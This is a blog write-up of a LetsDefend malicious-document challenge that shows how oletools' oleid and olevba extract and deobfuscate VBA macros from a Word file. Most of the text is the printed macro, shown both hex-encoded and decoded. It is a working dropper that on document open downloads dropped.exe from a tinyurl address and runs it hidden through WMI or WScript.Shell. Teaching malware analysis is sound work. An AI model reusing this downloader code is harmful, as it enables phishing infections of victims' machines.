---
layout: default
title: Oletools
---

# Oletools - Malicious Document analysis
## Day 2 of the security challenge!!
### Welcome back H4x0r!! Today's writeup will focus on malicious document analysis. The tool we'll be looking at today is Oletools.

[Oletools](https://github.com/decalage2/oletools) is a package of python tools used for analysis of Microsoft OLE2 files which include mainly MS Office documents and Outlook messages. It is used for malware analysis and digital forensics.

One common way phishing attacks are successful is by attaching malicious documents to emails. These malicious documents could either be malware designed to exfiltrate information from the victim or ransomware that encrypts the victim's file system. With oletools, you can analyse these malicious documents and "fish out" the threat actors 

Oletools package includes the following tools
- oleid: used to detect characteristics peculiar to malicious files.
- olevba: used to extract and analyze VBA Macro source code from MS Office documents. (VBA Source code is embedded code in MS Office documents which can be executed on opening the document)
- mraptor: used to detect malicious VBA Macro code
- oleobj: detects and extracts any embedded objects
- olemeta: extracts the standard information or metadata from the documents
and there's lot's more. Let's see what oletools can do

## Live Action!!
For the challenge today, we'll be using [Malicious VBA](https://app.letsdefend.io/challenge/Malicious-VBA) challenge on LetsDefend to practice use of this tool. I'll also again be using my REMnux VM for analysis. After downloading the file on the VM we start!

First we'll use oleid for initial detection
`oleid invoice.vb`
![Screenshot from 2023-10-17 12-38-49](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/0f8d6b6e-12f9-4bb2-bdab-31df91ebb1ef)

Notice that the file contains VBA Macros and malicious keywords were found. Let's use olevba for extraction
`olevba invoice.vb`

```
remnux@remnux:~$ olevba invoice.vb 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: invoice.vb
Type: Text
-------------------------------------------------------------------------------
VBA MACRO invoice.vb 
in file: invoice.vb - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
===============================================================================
FILE: inf.docm
Type: OpenXML
-------------------------------------------------------------------------------

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub avscuqctk()
Dim vxedylctlyqvkl As String
Dim yxxqowke As String
Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
Dim afcbydld As Integer
vxedylctlyqvkl = hgmneqolwgxg("68747470733a2f2f74696e") & hgmneqolwgxg("7975726c2e636f6d2f67327a3267683666")
yxxqowke = hgmneqolwgxg("64726f") & hgmneqolwgxg("707065642e657865")
yxxqowke = Environ("TEMP") & "\" & yxxqowke
Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("4d53584d4c322e") & hgmneqolwgxg("536572766572584d4c485454502e362e30"))
yqlcangepvrccrx.setOption(2) = 13056
yqlcangepvrccrx.Open hgmneqolwgxg("474554"), vxedylctlyqvkl, False
yqlcangepvrccrx.setRequestHeader hgmneqolwgxg("557365") & hgmneqolwgxg("722d4167656e74"), hgmneqolwgxg("4d6f7a696c6c612f342e302028636f6d7061") & hgmneqolwgxg("7469626c653b204d53494520362e303b2057696e646f7773204e5420352e3029")
yqlcangepvrccrx.Send
If yqlcangepvrccrx.Status = 200 Then
Set tmffoscpfdripcxpd = CreateObject(hgmneqolwgxg("41444f") & hgmneqolwgxg("44422e53747265616d"))
tmffoscpfdripcxpd.Open
tmffoscpfdripcxpd.Type = 1
tmffoscpfdripcxpd.Write yqlcangepvrccrx.ResponseBody
tmffoscpfdripcxpd.SaveToFile yxxqowke, 2
tmffoscpfdripcxpd.Close
jausltewrjghdtvi yxxqowke
End If
End Sub
Sub AutoOpen()
avscuqctk
End Sub
Private Function hgmneqolwgxg(ByVal mynmavyclwok As String) As String
Dim ejdwyblxvgpy As Long
For ejdwyblxvgpy = 1 To Len(mynmavyclwok) Step 2
hgmneqolwgxg = hgmneqolwgxg & Chr$(Val("&H" & Mid$(mynmavyclwok, ejdwyblxvgpy, 2)))
Next ejdwyblxvgpy
End Function

-------------------------------------------------------------------------------
VBA MACRO cuabumrbh.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub txsctapysvyvh(xflqpurtgr As String)
CreateObject(jmkrohkvctnt("575363726970742e5368656c") & jmkrohkvctnt("6c")).Run xflqpurtgr, 0
End Sub
Private Function jmkrohkvctnt(ByVal vgqofbnoswth As String) As String
Dim nfwbabqqwqxf As Long
For nfwbabqqwqxf = 1 To Len(vgqofbnoswth) Step 2
jmkrohkvctnt = jmkrohkvctnt & Chr$(Val("&H" & Mid$(vgqofbnoswth, nfwbabqqwqxf, 2)))
Next nfwbabqqwqxf
End Function

-------------------------------------------------------------------------------
VBA MACRO cwzbjoiuq.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cwzbjoiuq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub jausltewrjghdtvi(tibgkzhn As String)
On Error Resume Next
Err.Clear
wimResult = kshliitwryv(tibgkzhn)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
txsctapysvyvh tibgkzhn
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO lkxosgcqm.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function kshliitwryv(cmdLine As String) As Integer
Set rpmcsqkfmmefrk = GetObject(lylhbzknnnzm("77696e6d676d74") & lylhbzknnnzm("733a5c5c2e5c726f6f745c63696d7632"))
Set apcpmobozbywheter = rpmcsqkfmmefrk.Get(lylhbzknnnzm("57696e33325f50726f6365") & lylhbzknnnzm("737353746172747570"))
Set ojuovddfgrz = apcpmobozbywheter.SpawnInstance_
ojuovddfgrz.ShowWindow = 0
Set jcjvmxzi = GetObject(lylhbzknnnzm("77696e6d676d74733a5c5c2e5c726f6f745c63696d76323a57") & lylhbzknnnzm("696e33325f50726f63657373"))
kshliitwryv = jcjvmxzi.Create(cmdLine, Null, ojuovddfgrz, intProcessID)
End Function
Private Function lylhbzknnnzm(ByVal wawaggaffhsu As String) As String
Dim uuhcyhapguna As Long
For uuhcyhapguna = 1 To Len(wawaggaffhsu) Step 2
lylhbzknnnzm = lylhbzknnnzm & Chr$(Val("&H" & Mid$(wawaggaffhsu, uuhcyhapguna, 2)))
Next uuhcyhapguna
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|          |                    |(obfuscation: Hex)                           |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |pped.exe            |Executable file name (obfuscation: Hex)      |
|Hex String|https://tin         |68747470733a2f2f74696e                       |
|Hex String|yurl.com/g2z2gh6f   |7975726c2e636f6d2f67327a3267683666           |
|Hex String|pped.exe            |707065642e657865                             |
|Hex String|MSXML2.             |4d53584d4c322e                               |
|Hex String|ServerXMLHTTP.6.0   |536572766572584d4c485454502e362e30           |
|Hex String|r-Agent             |722d4167656e74                               |
|Hex String|Mozilla/4.0 (compa  |4d6f7a696c6c612f342e302028636f6d7061         |
|Hex String|tible; MSIE 6.0;    |7469626c653b204d53494520362e303b2057696e646f7|
|          |Windows NT 5.0)     |773204e5420352e3029                          |
|Hex String|DB.Stream           |44422e53747265616d                           |
|Hex String|WScript.Shel        |575363726970742e5368656c                     |
|Hex String|winmgmt             |77696e6d676d74                               |
|Hex String|s:\\.\root\cimv2    |733a5c5c2e5c726f6f745c63696d7632             |
|Hex String|Win32_Proce         |57696e33325f50726f6365                       |
|Hex String|ssStartup           |737353746172747570                           |
|Hex String|winmgmts:\\.\root\ci|77696e6d676d74733a5c5c2e5c726f6f745c63696d763|
|          |mv2:W               |23a57                                        |
|Hex String|in32_Process        |696e33325f50726f63657373                     |
+----------+--------------------+---------------------------------------------+
```
This is the result from the command. The VBA code was obfuscated so let's deobfuscate it with olevba.
`olevba --deobf --reveal invoice.vb`
I took the VBA Macro code and saved it in a separate file for further analysis and after a little cleaning up, it looked like this
```
===============================================================================
FILE: inf.docm
Type: OpenXML
-------------------------------------------------------------------------------

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub avscuqctk()
Dim vxedylctlyqvkl As String
Dim yxxqowke As String
Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
Dim afcbydld As Integer
vxedylctlyqvkl = "https://tinyurl.com/g2z2gh6f"
yxxqowke = "dropped.exe"
yxxqowke = "%TEMP%\" & yxxqowke
Set yqlcangepvrccrx = CreateObject("MSXML2.ServerXMLHTTP.6.0")
yqlcangepvrccrx.setOption(2) = 13056
yqlcangepvrccrx.Open "GET", vxedylctlyqvkl, False
yqlcangepvrccrx.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
yqlcangepvrccrx.Send
If yqlcangepvrccrx.Status = 200 Then
Set tmffoscpfdripcxpd = CreateObject("ADODB.Stream")
tmffoscpfdripcxpd.Open
tmffoscpfdripcxpd.Type = 1
tmffoscpfdripcxpd.Write yqlcangepvrccrx.ResponseBody
tmffoscpfdripcxpd.SaveToFile yxxqowke, 2
tmffoscpfdripcxpd.Close
jausltewrjghdtvi yxxqowke
End If
End Sub
Sub AutoOpen()
avscuqctk
End Sub
Private Function hgmneqolwgxg(ByVal mynmavyclwok As String) As String
Dim ejdwyblxvgpy As Long
For ejdwyblxvgpy = 1 To Len(mynmavyclwok) Step 2
hgmneqolwgxg = hgmneqolwgxg & Chr$(Val("&H" & Mid$(mynmavyclwok, ejdwyblxvgpy, 2)))
Next ejdwyblxvgpy
End Function

-------------------------------------------------------------------------------
VBA MACRO cuabumrbh.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub txsctapysvyvh(xflqpurtgr As String)
CreateObject("WScript.Shel" & jmkrohkvctnt("6c")).Run xflqpurtgr, 0
End Sub
Private Function jmkrohkvctnt(ByVal vgqofbnoswth As String) As String
Dim nfwbabqqwqxf As Long
For nfwbabqqwqxf = 1 To Len(vgqofbnoswth) Step 2
jmkrohkvctnt = jmkrohkvctnt & Chr$(Val("&H" & Mid$(vgqofbnoswth, nfwbabqqwqxf, 2)))
Next nfwbabqqwqxf
End Function

-------------------------------------------------------------------------------
VBA MACRO cwzbjoiuq.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cwzbjoiuq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub jausltewrjghdtvi(tibgkzhn As String)
On Error Resume Next
Err.Clear
wimResult = kshliitwryv(tibgkzhn)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
txsctapysvyvh tibgkzhn
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO lkxosgcqm.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function kshliitwryv(cmdLine As String) As Integer
Set rpmcsqkfmmefrk = GetObject("winmgmts:\\\\.\\root\\cimv2")
Set apcpmobozbywheter = rpmcsqkfmmefrk.Get("Win32_ProcessStartup")
Set ojuovddfgrz = apcpmobozbywheter.SpawnInstance_
ojuovddfgrz.ShowWindow = 0
Set jcjvmxzi = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
kshliitwryv = jcjvmxzi.Create(cmdLine, Null, ojuovddfgrz, intProcessID)
End Function
Private Function lylhbzknnnzm(ByVal wawaggaffhsu As String) As String
Dim uuhcyhapguna As Long
For uuhcyhapguna = 1 To Len(wawaggaffhsu) Step 2
lylhbzknnnzm = lylhbzknnnzm & Chr$(Val("&H" & Mid$(wawaggaffhsu, uuhcyhapguna, 2)))
Next uuhcyhapguna
End Function
```
Let's examine the code and answer our questions
![Screenshot from 2023-10-17 12-56-17](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/2998d512-03cc-4a62-b5f4-a2ae837706ac)

There's a link present in the Macro, possibly a stager to download the malware from the site. Our first qustion is answered!
![Screenshot from 2023-10-17 12-58-45](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/80faaa4f-3592-4387-9a56-939a51a37681)

The next line shows the name of the executable it is fetching, most likely a piece of malware. Question 2 is cleared!!
![Screenshot from 2023-10-17 13-00-14](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/1b470204-6d36-4ad4-8ebe-cc43d54d427c)

A few lines down, we see the malware trying to establish a HTTP connection to the web server and the method is shown there. 3rd question done!!!
![Screenshot from 2023-10-17 13-02-36](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/3533f3e0-5977-4530-ae8b-5e26c8178378)

We're grabbing more IOCs. We also find the User-Agent used in this connection. And that's question 4!!
![Screenshot from 2023-10-17 13-03-49](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/d6da8dd0-d113-44e4-9ec8-bca29d52d388)

Down a bit again, there's this `ADODB.Stream`. After doing research, I saw it's an object used in Windows environments specifically designed to work with binary data such as files. It allows you read from or write to binary files and is used in languages like VBScript to perform tasks like reading and writing binary data to and from files and databases. That answers our fifth question!
![Screenshot from 2023-10-17 13-09-15](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/905e75ae-ab68-4c9b-9a9e-2022ca1c8711)

![Screenshot from 2023-10-17 13-09-51](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/2bb9b90a-0ad9-4c7d-a962-a639fbcc23b4)


Scrolling down to the last part of the Macro code, there's another object `winmgmts:\\\\.\\root\\cimv2:Win32_Process`. This is a Windows Management Instrumentation (WMI) query which allows you to query information about running processes on a Windows endpoint. It satsifies the answer to our last question!!
![Screenshot from 2023-10-17 13-14-06](https://github.com/th3Cyb3rW0lf07/th3Cyb3rW0lf07.github.io/assets/66115581/96359daa-b772-476b-9afc-836b7ba7563a)


### We've conquered this malicious document! If you want more exercises on malicious document analysis, go to [LetsDefend](https://app.letsdefend.io/challenge) and you'll find some you can practice with.
### Till tomorrow, happy hacking H4x0r :)

<script src="https://tryhackme.com/badge/894204"></script>
